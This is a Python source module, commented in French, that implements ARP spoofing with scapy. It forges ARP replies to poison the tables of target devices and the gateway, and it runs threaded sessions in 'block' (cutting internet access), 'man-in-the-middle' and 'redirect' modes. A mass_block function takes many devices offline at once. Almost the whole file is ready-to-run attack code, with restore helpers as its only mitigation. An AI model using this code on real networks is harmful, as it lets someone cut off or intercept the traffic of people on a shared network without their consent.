"""
Gestionnaire ARP - ARP Spoofing, Man-in-the-Middle, manipulation de tables ARP
Attaques réseau sophistiquées avec contrôle précis
"""

import time
import threading
import struct
from typing import List, Dict, Optional, Set, Callable, NamedTuple
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import scapy.all as scapy
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP

from ..core import get_app_logger, NetworkUtils, ThreadSafeCounter, RateLimiter, retry
from .interfaces import NetworkAdapter
from .scanner import NetworkDevice


class ARPAttackTarget(NamedTuple):
    """Cible d'attaque ARP"""
    ip: str
    mac: str
    hostname: str
    vendor: str


@dataclass
class ARPAttackSession:
    """Session d'attaque ARP active"""
    target_ip: str
    target_mac: str
    gateway_ip: str
    gateway_mac: str
    attack_type: str  # "block", "mitm", "redirect"
    start_time: datetime = field(default_factory=datetime.now)
    packets_sent: int = 0
    is_active: bool = True
    last_packet_time: Optional[datetime] = None
    
    def get_duration(self) -> float:
        """Retourne la durée de l'attaque en secondes"""
        return (datetime.now() - self.start_time).total_seconds()
    
    def get_packets_per_second(self) -> float:
        """Retourne le taux de paquets par seconde"""
        duration = self.get_duration()
        return self.packets_sent / max(1, duration)


class ARPHandler:
    """Gestionnaire des attaques ARP et manipulation de tables"""
    
    def __init__(self, interface: NetworkAdapter):
        self.interface = interface
        self.logger = get_app_logger("ARPHandler")
        
        # État des attaques
        self.active_sessions: Dict[str, ARPAttackSession] = {}
        self.attacking = False
        self.attack_threads: Dict[str, threading.Thread] = {}
        self.stop_events: Dict[str, threading.Event] = {}
        
        # Configuration
        self.attack_interval = 1.0  # secondes entre les paquets ARP
        self.max_attack_threads = 20
        self.packet_burst_size = 1  # nombre de paquets par burst
        self.restore_on_stop = True  # restaurer les tables ARP à l'arrêt
        
        # Callbacks
        self.on_attack_started: Optional[Callable[[str, ARPAttackSession], None]] = None
        self.on_attack_stopped: Optional[Callable[[str, ARPAttackSession], None]] = None
        self.on_packet_sent: Optional[Callable[[str, int], None]] = None
        
        # Rate limiting et stats
        self.rate_limiter = RateLimiter(max_calls=200, time_window=1.0)
        self.total_packets_sent = ThreadSafeCounter()
        
        # Cache des adresses MAC
        self._mac_cache: Dict[str, str] = {}
        self._gateway_mac: Optional[str] = None
        self._local_mac: Optional[str] = None
        
        # Initialisation
        self._initialize_mac_addresses()
    
    def _initialize_mac_addresses(self):
        """Initialise les adresses MAC de base (gateway, machine locale)"""
        try:
            # MAC de la machine locale
            self._local_mac = self.interface.mac
            
            # MAC de la gateway
            if self.interface.gateway:
                self._gateway_mac = self._get_mac_address(self.interface.gateway)
                if self._gateway_mac:
                    self.logger.info(f"Gateway MAC trouvée: {self._gateway_mac}")
                else:
                    self.logger.warning("Impossible de récupérer la MAC de la gateway")
            
        except Exception as e:
            self.logger.error(f"Erreur lors de l'initialisation des MAC: {e}")
    
    @retry(max_attempts=3, delay=1.0)
    def _get_mac_address(self, ip: str) -> Optional[str]:
        """Récupère l'adresse MAC d'une IP via requête ARP"""
        if ip in self._mac_cache:
            return self._mac_cache[ip]
        
        try:
            # Créer une requête ARP
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=ip)
            response = scapy.srp1(arp_request, timeout=3, verbose=False, iface=self.interface.interface)
            
            if response and response.haslayer(ARP):
                mac = response[ARP].hwsrc
                self._mac_cache[ip] = mac
                return mac
                
        except Exception as e:
            self.logger.debug(f"Erreur lors de la récupération MAC pour {ip}: {e}")
        
        return None
    
    def _build_arp_packet(self, target_ip: str, target_mac: str, source_ip: str, source_mac: str) -> bytes:
        """Construit un paquet ARP personnalisé"""
        try:
            # Créer le paquet ARP de poisoning
            arp_packet = Ether(dst=target_mac, src=source_mac) / ARP(
                op="is-at",           # ARP Reply
                psrc=source_ip,       # IP source (celle qu'on usurpe)
                hwsrc=source_mac,     # MAC source (notre MAC)
                pdst=target_ip,       # IP destination (la cible)
                hwdst=target_mac      # MAC destination (MAC de la cible)
            )
            
            return bytes(arp_packet)
            
        except Exception as e:
            self.logger.error(f"Erreur lors de la construction du paquet ARP: {e}")
            return b""
    
    def _send_arp_poison(self, target_ip: str, target_mac: str, spoof_ip: str) -> bool:
        """Envoie un paquet ARP de poisoning"""
        if not self.rate_limiter.can_proceed():
            time.sleep(self.rate_limiter.wait_time())
        
        try:
            # Paquet ARP poison: dire à la cible que notre MAC correspond à spoof_ip
            poison_packet = Ether(dst=target_mac, src=self._local_mac) / ARP(
                op="is-at",
                psrc=spoof_ip,        # IP qu'on usurpe (gateway généralement)
                hwsrc=self._local_mac, # Notre MAC
                pdst=target_ip,       # IP de la cible
                hwdst=target_mac      # MAC de la cible
            )
            
            # Envoyer le paquet
            scapy.sendp(poison_packet, iface=self.interface.interface, verbose=False)
            
            self.total_packets_sent.increment()
            return True
            
        except Exception as e:
            self.logger.debug(f"Erreur lors de l'envoi du poison ARP: {e}")
            return False
    
    def _send_arp_restore(self, target_ip: str, target_mac: str, restore_ip: str, restore_mac: str) -> bool:
        """Restaure une entrée ARP légitime"""
        try:
            # Paquet ARP de restauration avec la vraie MAC
            restore_packet = Ether(dst=target_mac, src=restore_mac) / ARP(
                op="is-at",
                psrc=restore_ip,      # IP légitime
                hwsrc=restore_mac,    # MAC légitime
                pdst=target_ip,       # IP de la cible
                hwdst=target_mac      # MAC de la cible
            )
            
            # Envoyer plusieurs fois pour s'assurer de la restauration
            for _ in range(3):
                scapy.sendp(restore_packet, iface=self.interface.interface, verbose=False)
                time.sleep(0.1)
            
            return True
            
        except Exception as e:
            self.logger.error(f"Erreur lors de la restauration ARP: {e}")
            return False
    
    def _attack_worker(self, session_id: str, session: ARPAttackSession):
        """Worker thread pour une session d'attaque"""
        stop_event = self.stop_events[session_id]
        
        self.logger.info(f"Attaque ARP démarrée: {session.target_ip} -> {session.attack_type}")
        
        try:
            while not stop_event.is_set() and session.is_active:
                # Envoyer le(s) paquet(s) d'attaque
                for _ in range(self.packet_burst_size):
                    if stop_event.is_set():
                        break
                    
                    success = False
                    
                    if session.attack_type in ["block", "mitm"]:
                        # Poison bidirectionnel: cible -> gateway et gateway -> cible
                        success1 = self._send_arp_poison(
                            session.target_ip, session.target_mac, session.gateway_ip
                        )
                        success2 = self._send_arp_poison(
                            session.gateway_ip, session.gateway_mac, session.target_ip
                        )
                        success = success1 and success2
                        
                        if success:
                            session.packets_sent += 2
                    
                    elif session.attack_type == "redirect":
                        # Redirection simple: dire à la cible que nous sommes la gateway
                        success = self._send_arp_poison(
                            session.target_ip, session.target_mac, session.gateway_ip
                        )
                        
                        if success:
                            session.packets_sent += 1
                    
                    if success:
                        session.last_packet_time = datetime.now()
                        
                        # Callback
                        if self.on_packet_sent:
                            self.on_packet_sent(session_id, session.packets_sent)
                
                # Attendre avant le prochain cycle
                stop_event.wait(self.attack_interval)
        
        except Exception as e:
            self.logger.error(f"Erreur dans le worker d'attaque {session_id}: {e}")
        
        finally:
            # Restaurer les tables ARP si demandé
            if self.restore_on_stop and session.is_active:
                self._restore_arp_entry(session)
            
            session.is_active = False
            self.logger.info(f"Attaque ARP terminée: {session.target_ip} ({session.packets_sent} paquets)")
            
            # Callback d'arrêt
            if self.on_attack_stopped:
                self.on_attack_stopped(session_id, session)
    
    def _restore_arp_entry(self, session: ARPAttackSession):
        """Restaure les entrées ARP légitimes pour une session"""
        try:
            self.logger.info(f"Restauration des tables ARP pour {session.target_ip}")
            
            # Restaurer: cible -> gateway
            self._send_arp_restore(
                session.target_ip, session.target_mac,
                session.gateway_ip, session.gateway_mac
            )
            
            # Restaurer: gateway -> cible
            self._send_arp_restore(
                session.gateway_ip, session.gateway_mac,
                session.target_ip, session.target_mac
            )
            
        except Exception as e:
            self.logger.error(f"Erreur lors de la restauration ARP: {e}")
    
    def start_attack(self, target_device: NetworkDevice, attack_type: str = "block") -> bool:
        """Démarre une attaque ARP sur un appareil cible"""
        if not self._gateway_mac:
            self.logger.error("MAC de la gateway non disponible")
            return False
        
        if not self._local_mac:
            self.logger.error("MAC locale non disponible")
            return False
        
        session_id = f"{target_device.ip}_{attack_type}"
        
        # Vérifier si une attaque est déjà active sur cette cible
        if session_id in self.active_sessions:
            self.logger.warning(f"Attaque déjà active sur {target_device.ip}")
            return False
        
        # Créer la session d'attaque
        session = ARPAttackSession(
            target_ip=target_device.ip,
            target_mac=target_device.mac,
            gateway_ip=self.interface.gateway,
            gateway_mac=self._gateway_mac,
            attack_type=attack_type
        )
        
        # Créer l'event d'arrêt
        stop_event = threading.Event()
        
        # Créer et démarrer le thread d'attaque
        attack_thread = threading.Thread(
            target=self._attack_worker,
            args=(session_id, session),
            daemon=True
        )
        
        # Stocker les références
        self.active_sessions[session_id] = session
        self.stop_events[session_id] = stop_event
        self.attack_threads[session_id] = attack_thread
        
        # Démarrer l'attaque
        attack_thread.start()
        self.attacking = True
        
        self.logger.info(f"Attaque {attack_type} démarrée sur {target_device.ip} ({target_device.vendor})")
        
        # Callback de démarrage
        if self.on_attack_started:
            self.on_attack_started(session_id, session)
        
        return True
    
    def stop_attack(self, target_ip: str, attack_type: str = "block") -> bool:
        """Arrête une attaque ARP spécifique"""
        session_id = f"{target_ip}_{attack_type}"
        
        if session_id not in self.active_sessions:
            self.logger.warning(f"Aucune attaque active trouvée pour {session_id}")
            return False
        
        # Arrêter le thread
        if session_id in self.stop_events:
            self.stop_events[session_id].set()
        
        # Attendre la fin du thread
        if session_id in self.attack_threads:
            thread = self.attack_threads[session_id]
            if thread.is_alive():
                thread.join(timeout=5)
        
        # Nettoyer les références
        self._cleanup_session(session_id)
        
        self.logger.info(f"Attaque arrêtée: {session_id}")
        return True
    
    def stop_all_attacks(self):
        """Arrête toutes les attaques en cours"""
        self.logger.info("Arrêt de toutes les attaques ARP...")
        
        # Arrêter tous les threads
        for session_id in list(self.active_sessions.keys()):
            if session_id in self.stop_events:
                self.stop_events[session_id].set()
        
        # Attendre la fin de tous les threads
        for session_id, thread in list(self.attack_threads.items()):
            if thread.is_alive():
                thread.join(timeout=5)
        
        # Nettoyer toutes les sessions
        for session_id in list(self.active_sessions.keys()):
            self._cleanup_session(session_id)
        
        self.attacking = False
        self.logger.info("Toutes les attaques ARP arrêtées")
    
    def _cleanup_session(self, session_id: str):
        """Nettoie une session d'attaque"""
        if session_id in self.active_sessions:
            del self.active_sessions[session_id]
        if session_id in self.stop_events:
            del self.stop_events[session_id]
        if session_id in self.attack_threads:
            del self.attack_threads[session_id]
        
        # Vérifier s'il reste des attaques actives
        if not self.active_sessions:
            self.attacking = False
    
    def is_attacking(self, target_ip: str = None) -> bool:
        """Vérifie si une attaque est en cours"""
        if target_ip:
            return any(session_id.startswith(target_ip) for session_id in self.active_sessions)
        return self.attacking
    
    def get_active_attacks(self) -> List[ARPAttackSession]:
        """Retourne la liste des attaques actives"""
        return [session for session in self.active_sessions.values() if session.is_active]
    
    def get_attack_session(self, target_ip: str, attack_type: str = "block") -> Optional[ARPAttackSession]:
        """Récupère une session d'attaque spécifique"""
        session_id = f"{target_ip}_{attack_type}"
        return self.active_sessions.get(session_id)
    
    def block_device(self, device: NetworkDevice) -> bool:
        """Bloque complètement un appareil (pas d'accès Internet)"""
        return self.start_attack(device, "block")
    
    def unblock_device(self, device: NetworkDevice) -> bool:
        """Débloque un appareil"""
        return self.stop_attack(device.ip, "block")
    
    def start_mitm(self, device: NetworkDevice) -> bool:
        """Démarre une attaque Man-in-the-Middle"""
        return self.start_attack(device, "mitm")
    
    def stop_mitm(self, device: NetworkDevice) -> bool:
        """Arrête une attaque Man-in-the-Middle"""
        return self.stop_attack(device.ip, "mitm")
    
    def redirect_device(self, device: NetworkDevice) -> bool:
        """Redirige le trafic d'un appareil vers nous"""
        return self.start_attack(device, "redirect")
    
    def stop_redirect(self, device: NetworkDevice) -> bool:
        """Arrête la redirection d'un appareil"""
        return self.stop_attack(device.ip, "redirect")
    
    def mass_block(self, devices: List[NetworkDevice]) -> Dict[str, bool]:
        """Bloque plusieurs appareils en même temps"""
        results = {}
        
        with ThreadPoolExecutor(max_workers=self.max_attack_threads) as executor:
            futures = {
                executor.submit(self.block_device, device): device.ip 
                for device in devices
            }
            
            for future in futures:
                ip = futures[future]
                try:
                    results[ip] = future.result()
                except Exception as e:
                    self.logger.error(f"Erreur lors du blocage de {ip}: {e}")
                    results[ip] = False
        
        return results
    
    def mass_unblock(self, devices: List[NetworkDevice]) -> Dict[str, bool]:
        """Débloque plusieurs appareils en même temps"""
        results = {}
        
        for device in devices:
            results[device.ip] = self.unblock_device(device)
        
        return results
    
    def get_statistics(self) -> Dict[str, any]:
        """Retourne les statistiques des attaques ARP"""
        active_attacks = self.get_active_attacks()
        
        # Stats par type d'attaque
        attack_types = {}
        for session in active_attacks:
            attack_types[session.attack_type] = attack_types.get(session.attack_type, 0) + 1
        
        # Durée moyenne des attaques
        total_duration = sum(session.get_duration() for session in active_attacks)
        avg_duration = total_duration / max(1, len(active_attacks))
        
        # Total des paquets envoyés
        total_packets = sum(session.packets_sent for session in active_attacks)
        
        return {
            'attacking': self.attacking,
            'active_sessions': len(active_attacks),
            'total_packets_sent': self.total_packets_sent.get(),
            'session_packets_sent': total_packets,
            'attack_types': attack_types,
            'average_duration': avg_duration,
            'attack_interval': self.attack_interval,
            'interface': self.interface.interface,
            'gateway_mac': self._gateway_mac,
            'local_mac': self._local_mac
        }
    
    def set_attack_interval(self, interval: float):
        """Modifie l'intervalle entre les paquets d'attaque"""
        self.attack_interval = max(0.1, interval)  # Minimum 100ms
        self.logger.info(f"Intervalle d'attaque modifié: {self.attack_interval}s")
    
    def set_packet_burst_size(self, size: int):
        """Modifie le nombre de paquets par burst"""
        self.packet_burst_size = max(1, min(size, 10))  # Entre 1 et 10
        self.logger.info(f"Taille de burst modifiée: {self.packet_burst_size}")
    
    def enable_auto_restore(self, enabled: bool):
        """Active/désactive la restauration automatique"""
        self.restore_on_stop = enabled
        self.logger.info(f"Restauration automatique: {'activée' if enabled else 'désactivée'}")
    
    def manual_arp_restore(self, target_ip: str, gateway_ip: str = None) -> bool:
        """Restaure manuellement les tables ARP pour une IP"""
        if not gateway_ip:
            gateway_ip = self.interface.gateway
        
        try:
            # Récupérer les vraies MACs
            target_mac = self._get_mac_address(target_ip)
            gateway_mac = self._get_mac_address(gateway_ip)
            
            if not target_mac or not gateway_mac:
                self.logger.error("Impossible de récupérer les adresses MAC pour la restauration")
                return False
            
            # Restaurer bidirectionnellement
            success1 = self._send_arp_restore(target_ip, target_mac, gateway_ip, gateway_mac)
            success2 = self._send_arp_restore(gateway_ip, gateway_mac, target_ip, target_mac)
            
            if success1 and success2:
                self.logger.info(f"Tables ARP restaurées pour {target_ip}")
                return True
            
        except Exception as e:
            self.logger.error(f"Erreur lors de la restauration manuelle: {e}")
        
        return False
    
    def clear_mac_cache(self):
        """Vide le cache des adresses MAC"""
        self._mac_cache.clear()
        self.logger.info("Cache MAC vidé")
    
    def refresh_gateway_mac(self) -> bool:
        """Rafraîchit l'adresse MAC de la gateway"""
        if self.interface.gateway:
            self._gateway_mac = self._get_mac_address(self.interface.gateway)
            if self._gateway_mac:
                self.logger.info(f"MAC de la gateway rafraîchie: {self._gateway_mac}")
                return True
        return False


def create_arp_handler(interface: NetworkAdapter) -> ARPHandler:
    """Factory function pour créer un gestionnaire ARP"""
    return ARPHandler(interface)